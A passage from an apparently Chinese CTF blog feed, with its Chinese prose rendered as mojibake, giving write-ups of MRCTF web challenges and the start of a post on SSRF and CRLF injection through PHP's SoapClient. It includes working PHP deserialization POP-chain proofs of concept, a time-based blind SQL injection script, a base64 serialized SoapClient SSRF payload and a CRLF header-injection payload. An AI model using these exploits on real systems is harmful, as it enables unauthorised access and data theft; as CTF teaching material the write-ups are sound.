$_GET[&#39;b_u_p_t&#39;])){    echo </code></pre><p>ä½¿ç”¨<code>b.u.p.t</code>æ›¿ä»£ï¼Œä»¥åŠåœ¨23333ååŠ ä¸Š%0aç»•è¿‡preg_match()</p><p>ç¬¬äºŒå±‚<br>é¦–å…ˆä¸€å †jsfuckï¼Œæ‰”Chromeæ§åˆ¶å°å¾—åˆ°ä¸€ä¸ªæç¤ºpost Merak,ä¼ ä¸ªå€¼å¾—åˆ°æºç </p><pre><code class="php">&lt;?php error_reporting(0); include &#39;takeip.php&#39;;ini_set(&#39;open_basedir&#39;,&#39;.&#39;); include &#39;flag.php&#39;;if(isset($_POST[&#39;Merak&#39;])){     highlight_file(__FILE__);     die(); } function change($v){     $v = base64_decode($v);     $re = &#39;&#39;;     for($i=0;$i&lt;strlen($v);$i++){         $re .= chr ( ord ($v[$i]) + $i*2 );     }     return $re; }echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#39;127.0.0.1&#39;)echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);echo file_get_contents(change($_GET[&#39;file&#39;])); }?&gt; </code></pre><p>æ¥ç€è€å¥—å¨ƒäº†ã€‚<br>é¦–å…ˆæ˜¯<code>getIp()</code>å‡½æ•°ï¼Œå»å®˜ç½‘æŸ¥äº†ä¸‹ï¼Œæ˜¯headerå¯æ§ã€‚é‚£å°±headerè®¾ç½®ä¸º<code>Client-IP:127.0.0.1</code><br>ç„¶åä¸ºäº†<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>è¿™æ­¥è€æ–¹æ³•ä½¿ç”¨dataåè®®<br><code>data://text/plain,todat is a happy day</code><br>æœ€åä¸€ä¸ªfileå…ˆç”¨ä¸Šé¢ç»™çš„å‡½æ•°æ”¹æ”¹ç¼–ç ä¸‹å³å¯ã€‚</p><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>popé“¾æ„é€ ,å®è¯è¯´ä¸‰ä¸ªç±»çš„popå¾ˆåŸºç¡€ï¼Œä¸è¿‡æˆ‘å¼€å§‹è§‰å¾—è¿™ä¸ªèµ·ç‚¹è´¼è¯¡å¼‚ã€‚</p><pre><code class="php">&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {    protected  $var;    public function append($value){        include($value);    }    public function __invoke(){        $this-&gt;append($this-&gt;var);    }}class Show{    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;){        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    }    public function __toString(){        return $this-&gt;str-&gt;source;    }    public function __wakeup(){        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class Test{    public $p;    public function __construct(){        $this-&gt;p = array();    }    public function __get($key){        $function = $this-&gt;p;        return $function();    }}if(isset($_GET[&#39;pop&#39;])){    @unserialize($_GET[&#39;pop&#39;]);}else{    $a=new Show;    highlight_file(__FILE__);}</code></pre><p>ç›®æ ‡è‡ªç„¶æ˜¯include flag.phpäº†ã€‚ä¸è¿‡æœ€å¥½ç›´æ¥ä¼ªåè®®è¯»ã€‚</p><p>é¦–å…ˆè¦è§¦å‘<code>__toString</code>é‚£å°±å…ˆæ¥ä¸ªechoã€‚ä¹Ÿå°±æ˜¯è¯´è¿˜å¾—å†æ¥ä¸ªShowç±»å¯¹è±¡ç½®ä¸ºå®ƒçš„sourceå±æ€§,echoæ—¶è§¦å‘.Showç±»å¸¦Showç±»,è®²ç©¶ã€‚</p><p>ä¹‹å<code>$this-&gt;str-&gt;source</code>æ˜æ˜¾å¯ä»¥è§¦å‘Testçš„<code>__get()</code>ï¼Œç„¶åè¿”å›å€¼æ˜¯å‡½æ•°ï¼Œé‚£å°±å¯ä»¥è§¦å‘Modiferçš„<code>__invoke()</code>äº†ã€‚</p><p>å¾ˆç®€å•çš„é“¾å­ï¼Œå°±æ˜¯ç¬¬ä¸€æ­¥è‡ªå·±å¼€å§‹çŠ¯å‚»ä»¥ä¸º__toString()è§¦å‘æ˜¯echoæ—¶è‡ªåŠ¨å°±æœ‰çš„ï¼Œæƒ³äº†åŠå¤©ç¡®è®¤åº”è¯¥è¿˜æ˜¯å¾—å¯¹è±¡echoæ‰ä¼šè§¦å‘ã€‚è¿™ç‚¹ä¸èƒ½æ··æ·†ã€‚<br>poc:</p><pre><code class="php">&lt;?phpclass Modifier {    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;}class Show{    public $source;    public $str;}class Test{    public $p;}$a=new Show();$b=new Show();$a-&gt;source=$b;$b-&gt;str=new Test();$b-&gt;str-&gt;p=new Modifier();echo(urlencode(serialize($a)));</code></pre><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>æç¤ºaudité‚£å°±çœ‹çœ‹æºç æ³„éœ²ã€‚å‘ç°<a href="http://www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç " target="_blank" rel="noopener">www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç </a></p><pre><code class="php">&lt;?php header(&#39;Content-type:text/html; charset=utf-8&#39;);error_reporting(0);if(isset($_POST[&#39;login&#39;])){    $username = $_POST[&#39;username&#39;];    $password = $_POST[&#39;password&#39;];    $Private_key = $_POST[&#39;Private_key&#39;];    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) {        // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢        header(&#39;refresh:2; url=login.html&#39;);        echo &quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;        exit;}    else if($Private_key != &#39;*************&#39; )    {        header(&#39;refresh:2; url=login.html&#39;);        echo &quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;;        exit;    }    else{        if($Private_key === &#39;************&#39;){        $getuser = &quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&quot;.&#39;;&#39;;         $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);        mysql_select_db(&quot;test&quot;,$link);        $result = mysql_query($getuser);        while($row=mysql_fetch_assoc($result)){            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;        }    }    }} // genarate public_key function public_key($length = 16) {    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $public_key = &#39;&#39;;    for ( $i = 0; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);    return $public_key;  }  //genarate private_key  function private_key($length = 12) {    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $private_key = &#39;&#39;;    for ( $i = 0; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);    return $private_key;  }  $Public_key = public_key();  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</code></pre><p>åªè¦ç»•è¿‡ä¸€ä¸ªç§é’¥å³å¯sqlæ³¨å…¥ã€‚<br>é‚£ä¹ˆæ³¨æ„åˆ°å…¬,ç§é’¥æ˜¯é€šè¿‡mt_rand()ç”Ÿæˆçš„ï¼Œé‚£å°±å¥½è¯´ã€‚ç›´æ¥./mt_rèµ°èµ·<br>å…ˆå°†å…¬é’¥è½¬ä¸ºè„šæœ¬å¯è¯†åˆ«çš„æ•°æ®</p><pre><code class="python">str1=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;str2=&#39;KVQP0LdJKRaV3n9D&#39;str3 = str1[::-1]length = len(str2)res=&#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>ç„¶åè®¾å®šå¥½éšæœºæ•°ç§å­ï¼ŒæŒ‰å…ˆå…¬é’¥,å†ç§é’¥çš„é¡ºåºç”Ÿæˆã€‚å¾—åˆ°ç§é’¥<code>XuNhoueCDCGc</code><br>ç›´æ¥sqlæ³¨å…¥å³å¯</p><pre><code class="python">import requestsurl=&#39;http://aa90a604-c5bb-44d9-8589-b9614155f505.merak-ctf.site/login.php&#39;flag=&#39;&#39;for i in range(1,50):    print(i)    for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.{}-&quot;:        payload = &quot;1&#39; or if(ascii(substr(flag,&quot;+str(i)+&quot;,1))=&quot;+str(ord(str1))+&quot;,sleep(3),1)#&quot;        data = {            &#39;username&#39;: &#39;admin&#39;,            &#39;password&#39;: payload,            &#39;Private_key&#39;: &#39;XuNhoueCDCGc&#39;,            &#39;login&#39;: &#39;1&#39;        }        try:            r = requests.post(url, data=data,timeout=3)        except requests.exceptions.ReadTimeout:            flag += str1            print(flag)            break</code></pre><p>æ‰“å¼€kali+çˆ†ç ´ç§å­èŠ±äº†10å¤šåˆ†é’Ÿï¼Œå‰å‡ è¡€åˆæ²¡äº†ã€‚å¿ƒé‡Œè‹¦ã€‚<br>äº‹åä»”ç»†ä¸€çœ‹sqlè¯­å¥å·²ç»å†™å¥½äº†ï¼Œæ‰€ä»¥åªè¦ä¸‡èƒ½å¯†ç å°±è¡Œäº†ã€‚éš¾æ€ªæ‰‹é€Ÿæ…¢ï¼Œè¯¥æ‰“ã€‚</p><h2 id="Ezpop-revenge"><a href="#Ezpop-revenge" class="headerlink" title="Ezpop_revenge"></a>Ezpop_revenge</h2><p>æ‰“ç®—å†™wpå°±æ˜¯ä¸ºäº†è¿™é¢˜ã€‚è´¨é‡ç»å¯¹å¤Ÿã€‚<br>å¼€å§‹ä¸‹è½½<a href="http://www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚" target="_blank" rel="noopener">www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚</a><br>è·Ÿzjyå¸ˆå‚…å®¡å‡ºäº†å…¥å£+åˆ©ç”¨ç‚¹å°±æ‡’å¾—å†™pocäº†ã€‚ä¸è¿‡è¿˜æ˜¯å¾—åŠ¨æ‰‹åšåšæ‰è¡Œã€‚ï¼ˆæ¯•ç«Ÿå®é™…å†™èµ·æ¥å¤šåŠç›´æ¥æ‹‰èƒ¯ï¼‰</p><p>é¦–å…ˆæ˜¯ç»ˆç»“ç‚¹</p><pre><code class="php">&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER[&#39;REMOTE_ADDR&#39;]===&quot;127.0.0.1&quot;){   $_SESSION[&#39;flag&#39;]= &quot;MRCTF{******}&quot;;}else echo &quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;;?&gt;</code></pre><p>æ˜¾ç„¶æ˜¯è¦ssrfã€‚è€Œä¸”è¿™é‡Œè®©æˆ‘è«åæƒ³åˆ°äº†ä¹‹å‰LCTFçš„bestphpâ€™srevenge.å°±æ˜¯é€šè¿‡Soapæ‰“ssrfçš„ä¸€ä¸ªtrick.<br>ç„¶åæ‰¾å…¥å£äº†ã€‚<br>è¿™é‡Œéš¾å—çš„æ˜¯phpstormå…¨å±€æœç´¢æ‰¾ä¸åˆ°unserializeã€‚è¿˜æ˜¯zjyå¸ˆå‚…å¸®æˆ‘æ‰¾åˆ°çš„.åŸæ¥æ˜¯æ’ä»¶é‡Œé¢æ‰‹å†™çš„ä¸€ä¸ªç±»<br>ä¸»ä½“å‡½æ•°å¤§æ¦‚è¿™ä¹ˆå¤š</p><pre><code class="php">class HelloWorld_DB{    private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;;    private $coincidence;    function  __wakeup(){        $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);    }}public function action(){        if(!isset($_SESSION)) session_start();        if(isset($_REQUEST[&#39;admin&#39;])) var_dump($_SESSION);        if (isset($_POST[&#39;C0incid3nc3&#39;])) {            if(preg_match(&quot;/file|assert|eval|[`\&#39;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#39;C0incid3nc3&#39;])) === 0)                unserialize(base64_decode($_POST[&#39;C0incid3nc3&#39;]));            else {                echo &quot;Not that easy.&quot;;            }        }    }</code></pre><p>æ³¨æ„åˆ°wakeupåè‡ªç„¶æ˜ç™½ååºåˆ—åŒ–çš„è§¦å‘æ–¹å¼äº†.åŒæ—¶æŒ‰ç…§LCTFçš„ç»éªŒï¼Œè¿™é‡Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªä¸€ä¸ªåŒå‚æ•°å‡½æ•°ï¼Œå³<code>call_user_func</code>+Soapæ‰“ssrfã€‚<br>è·Ÿä¸€ä¸‹Typecho_Dbç±»<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœä¸å…¶ç„¶æœ‰ä¸ª<code>call_user_func</code>ã€‚è€Œä¸”å‚æ•°éƒ½å¯æ§ï¼Œé“¾å­ç»“æŸã€‚æ‰€ä»¥å…¶å®å°±æ˜¯ä¸ªåŸé¢˜é­”æ”¹äº†ä¸‹ã€‚å½“æ—¶çœ‹åˆ°è¿™å°±æ²¡åšäº†ã€‚</p><p>ç„¶è€Œäº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ã€‚åæ¥å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚é‚£å°±æ˜¯LCTFå¯ä»¥åˆ©ç”¨sessionå¤„ç†å™¨å°†Soapçš„åºåˆ—åŒ–æ•°æ®å†™åˆ°sessioné‡Œï¼Œç„¶å<code>call_user_func</code>è§¦å‘ã€‚è¿™é‡Œå´ä¸è¡Œã€‚é‚£å°±éœ€è¦æŠŠé“¾å­å†å¤šæŒ–ä¸€ä¸‹.</p><p>æ³¨æ„åˆ°ä¹‹å‰çš„ç»“å°¾æç¤ºæˆ‘ä»¬<code>__toString()</code>ã€‚å…¨å±€æœç´¢ä¸‹toStringï¼Œè·Ÿåˆ°\var\Typecho\Db\Query.phpä¸‹ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ³¨æ„åˆ°è¿™é‡Œï¼Œ<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>æ—¶æ‰§è¡Œäº†<code>_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ã€‚åº”è¯¥å¯ä»¥æ»¡è¶³æˆ‘ä»¬è§¦å‘Soapçš„æ¡ä»¶ï¼Œå³è°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•ã€‚<br>æ¢³ç†å®Œé‡ç‚¹åå¼€å§‹æ„é€ äº†ã€‚</p><pre><code>$db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);=&gt;call_user_func(array($adapterName, &#39;isAvailable&#39;))    =&gt; __toString()//Typecho_Db_Query      =&gt; $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code></pre><p>åªç”¨åˆ°ä¸¤ä¸ªç±»,popé“¾ä¸é•¿ï¼ˆhhhï¼‰<br>poc</p><pre><code class="php">class Typecho_Db_Query{    private $_adapter;    private $_sqlPreBuild;    function __construct(){        $target = &quot;http://127.0.0.1/flag.php&quot;;        $headers = array(            &#39;X-Forwarded-For:127.0.0.1&#39;,            &quot;Cookie: PHPSESSID=b92shmac496iqkek97vkuetnn0&quot;        );        $this-&gt;_adapter = new SoapClient(null, array(&#39;uri&#39; =&gt; &#39;abc&#39;, &#39;location&#39; =&gt; $target, &#39;user_agent&#39; =&gt; &#39;byc404^^&#39; . join(&#39;^^&#39;, $headers)));        $this-&gt;_sqlPreBuild = [&#39;action&#39; =&gt; &quot;SELECT&quot;];    }}class HelloWorld_DB{    private $coincidence;    public function __construct()    {        $this-&gt;coincidence = array(&quot;hello&quot; =&gt; new Typecho_Db_Query());    }}$poc = serialize(new HelloWorld_DB());$poc = preg_replace(&quot; /\^\^/&quot;, &quot;\r\n&quot;, $poc);echo base64_encode($poc);</code></pre><p>ç„¶åè§¦å‘çš„åœ°æ–¹æ²¡æ‰¾åˆ°â€¦â€¦åŸæ¥åœ¨/var/Typeecho/Plugin.phpé‡Œ</p><pre><code class="php">    public static function activate($pluginName)    {        self::$_plugins[&#39;activated&#39;][$pluginName] = self::$_tmp;        self::$_tmp = array();        Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,&#39;action&#39;);    }</code></pre><p>é‚£ä¹ˆå°±å°è¯•æäº¤pocã€‚</p><pre><code>post: C0incid3nc3=TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7czoyNjoiAEhlbGxvV29ybGRfREIAY29pbmNpZGVuY2UiO2E6MTp7czo1OiJoZWxsbyI7TzoxNjoiVHlwZWNob19EYl9RdWVyeSI6Mjp7czoyNjoiAFR5cGVjaG9fRGJfUXVlcnkAX2FkYXB0ZXIiO086MTA6IlNvYXBDbGllbnQiOjU6e3M6MzoidXJpIjtzOjM6ImFiYyI7czo4OiJsb2NhdGlvbiI7czoyNToiaHR0cDovLzEyNy4wLjAuMS9mbGFnLnBocCI7czoxNToiX3N0cmVhbV9jb250ZXh0IjtpOjA7czoxMToiX3VzZXJfYWdlbnQiO3M6Nzk6ImJ5YzQwNA0KWC1Gb3J3YXJkZWQtRm9yOjEyNy4wLjAuMQ0KQ29va2llOiBQSFBTRVNTSUQ9bW9pODU2cXVxcHU2bXV2bWhnYTdrbzdwNTMiO3M6MTM6Il9zb2FwX3ZlcnNpb24iO2k6MTt9czozMDoiAFR5cGVjaG9fRGJfUXVlcnkAX3NxbFByZUJ1aWxkIjthOjE6e3M6NjoiYWN0aW9uIjtzOjY6IlNFTEVDVCI7fX19fQ==</code></pre><p>ç„¶å<code>?admin=1</code>è®¿é—®å³å¯ã€‚<br>ç„¶ååº”è¯¥æ˜¯è·ŸLCTFä¸€æ ·ï¼Œæœ€å¥½payloadè·Ÿæ£€æŸ¥flagçš„PHPSESSIDä¸è¦ç”¨åŒä¸€ä¸ªã€‚æˆ‘çœ‹Nepnepå¸ˆå‚…ä»¬çš„wpé‡Œè¯´ç›´æ¥ç”Ÿæˆçš„payloadè¿‡ä¸å»ã€‚æˆ‘åæ­£??????äººå®¶ç‰¹æ„è®¾å®šçš„base64encodeæ ¹æœ¬ä¸å­˜åœ¨privateç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜å•Šã€‚åæ­£æˆ‘æ˜¯å¯ä»¥ç›´æ¥æ‰“çš„,åº”è¯¥æ²¡å•¥é—®é¢˜ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¤§æ¦‚è¿™ä¹ˆå¤šï¼Œé¢˜ç›®æ¯•ç«Ÿæ–°æ‰‹é¢˜ã€‚æ”¶è·è°ˆä¸ä¸Šï¼Œæ²¡æ‰é“¾å­å°±ç®—æ»¡æ„äº†ã€‚æœ€åä¸€é¢˜ä¹Ÿæé†’äº†è‡ªå·±æ‹’ç»æƒ³å½“ç„¶ï¼Œé“¾å­æ²¡å†™å‡ºæ¥å°±ä¸èƒ½ç©ºæƒ³ï¼Œå®åœ¨çš„pocæ‰æ˜¯ç‹é“ã€‚è¿‡å‡ å¤©æŠŠå¹½çµçŒ«çš„æ€»ç»“ä¸‹ã€‚æ¯•ç«Ÿå›½é™…èµ›ä¸Šä¹Ÿé‡åˆ°äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Soapçš„ssrf/crlfæ”»å‡»</title>
      <link href="2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/"/>
      <url>2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‡ å¤©åœ¨buuä¸Šç–¯ç‹‚åˆ·é¢˜ã€‚çªç„¶æ¥è§¦åˆ°äº†ä¸€ä¸ªä¹‹å‰æ²¡æœ‰æ³¨æ„è¿‡çš„çŸ¥è¯†ç‚¹ã€‚é‚£å°±æ˜¯ä½¿ç”¨Soapè¿›è¡Œssrfã€‚ç›®å‰åšåˆ°çš„å‡ é“é¢˜ä¸ªäººè§‰å¾—è¿˜æ˜¯éå¸¸æœ‰è¥å…»çš„ã€‚é‚£ä¹ˆå¹²è„†æ€»ç»“ä¸‹å…³äºphp+Soapçš„ç›¸å…³çŸ¥è¯†ã€‚</p><a id="more"></a><h1 id="Soap"><a href="#Soap" class="headerlink" title="Soap"></a>Soap</h1><p>SOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDLã€UDDIï¼‰ä¹‹ä¸€ï¼š</p><ul><li><p>WSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ã€‚</p></li><li><p>UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webServiceã€‚</p></li><li><p>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚<br>å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚</p></li></ul><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>PHP çš„ SOAP æ‰©å±•å¯ä»¥ç”¨æ¥æä¾›å’Œä½¿ç”¨ Web Services<br>è¿™ä¸ªæ‰©å±•å®ç°äº†6ä¸ªç±»ã€‚å…¶ä¸­æœ‰ä¸‰ä¸ªé«˜çº§çš„ç±»ï¼š SoapClientã€SoapServer å’ŒSoapFaultï¼Œ<br>å’Œä¸‰ä¸ªä½çº§ç±»ï¼Œå®ƒä»¬æ˜¯ SoapHeaderã€SoapParam å’Œ SoapVarã€‚<br>å…¶æ„é€ æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre><code class="php">public SoapClient :: SoapClient ï¼ˆmixed $wsdl [ï¼Œarray $options ]ï¼‰</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚é€šå¸¸æˆ‘ä»¬æ„é€ æ—¶è®¾ä¸ºnullå³å¯ã€‚</p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</p><p>è¿™é‡Œæœ‰è¶£çš„åœ°æ–¹å°±åœ¨äºä¸¤ç‚¹</p><ul><li>SoapClientæ˜¯phpçš„åŸç”Ÿç±»ã€‚ä¸”å®ƒæœ‰ä¸€ä¸ª<code>__call()</code>é­”æœ¯æ–¹æ³•</li><li>SoapClientçš„ç¬¬äºŒä¸ªå‚æ•°å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰User-Agent</li></ul><p>æ¥ä¾æ¬¡è§£é‡Šä¸‹è¿™ä¸¤ä¸ªæœ‰è¶£ä¹‹å¤„<br>1.åŸç”Ÿç±»è¯´æ˜æˆ‘ä»¬ä¸éœ€è¦åˆ»æ„å»å¯»æ‰¾php POPChainä¸­çš„åˆ©ç”¨ç‚¹ã€‚å› ä¸ºSoapå·²ç»æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªç°æˆçš„é­”æœ¯æ–¹æ³•ã€‚è€Œåªè¦ç”¨Soap,æˆ‘ä»¬å°±å¯ä»¥è¾¾æˆssrfï¼Œå¯ä»¥æ‰“å†…ç½‘.</p><p>2.User-Agentå¯è‡ªå®šä¹‰å¸¦æ¥çš„æ˜¯CRLFæ³¨å…¥çš„å¯èƒ½ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿå› ä¸ºhttp headeré‡Œæœ‰ä¸€ä¸ªé‡è¦çš„Content-Typeä¸ºå’ŒContent-Lengthã€‚<br>è€ŒUser-Agentçš„http headerä½ç½®æ­£å¥½åœ¨è¿™äº›ä¹‹ä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè¦†ç›–ã€‚å¯¹äºContent-Typeï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ©ç”¨CRLFå‘é€postè¯·æ±‚ï¼Œé‚£ä¹ˆè¦æ±‚å®ƒä¸ºapplication/x-www-form-urlencode<br>é‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨CRLFï¼Œæ„é€ å¦‚ä¸‹payload</p><pre><code>$payload = new SoapClient(null,array(&#39;user_agent&#39;=&gt;&quot;test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:45\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=470837\r\n\r\n\r\n&quot;,&#39;location&#39;=&gt;$location,&#39;uri&#39;=&gt;$uri));</code></pre><p>CRLFä¸SSRFï¼Œè¿™ä¸¤ä¸ªæ¼æ´éƒ½å¯ä»¥é€šè¿‡SoapClientè¾¾æˆã€‚</p><h1 id="çœŸé¢˜"><a href="#çœŸé¢˜" class="headerlink" 